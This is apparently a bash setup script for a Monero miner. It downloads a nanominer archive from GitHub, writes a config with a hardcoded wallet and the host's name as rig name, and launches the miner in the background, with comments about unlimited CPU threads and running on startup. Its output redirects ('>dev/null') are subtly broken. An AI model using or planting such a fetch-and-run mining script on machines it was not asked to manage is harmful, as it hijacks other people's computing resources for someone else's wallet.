#!/bin/bash
wget https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/nanominer-linux-3.3.4.tar.xz>dev/null
tar -xf nanominer-linux-3.3.4.tar.xz>dev/null
cd nanominer-linux-3.3.4

# X-Mode - No limit on cpu threads
touch config.ini
rm config.ini

echo "Configuring miner..."

echo "[RandomX]" >> config.ini
echo "wallet = 42VmQmradix9d5QaHZdo9pUvaH4Ua94WV22VK1HNcAEUbuDxSNXFCoH3h5GA5F8nUuh9a76xzt7sURb4wNgXVDn77qBvRBa" >> config.ini 
echo "rigName = " `cat /proc/sys/kernel/hostname` >> config.ini
echo "email = yokohama@mailinator.com" >> config.ini
echo "sortPools = true" >> config.ini 

# Some refinements needed:
# Always check nanominer is not running before starting
# Enable run on startup - with a service, in the background

# Start as a background process
nohup ./nanominer &

echo "Setup complete, mining in progress"